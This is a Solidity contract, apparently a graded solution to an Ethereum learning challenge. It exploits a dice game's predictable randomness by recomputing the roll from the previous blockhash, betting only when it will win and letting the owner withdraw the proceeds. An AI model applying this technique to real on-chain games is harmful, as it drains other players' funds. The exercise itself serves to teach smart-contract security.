pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable to) external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH to withdraw");
        to.transfer(balance);
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external {
        uint256 predictedRoll = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    address(this)
                )
            )
        ) % 16;

        // Only roll if it will win
        if (predictedRoll <= 2) {
            diceGame.rollTheDice{value: 0.002 ether}();
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
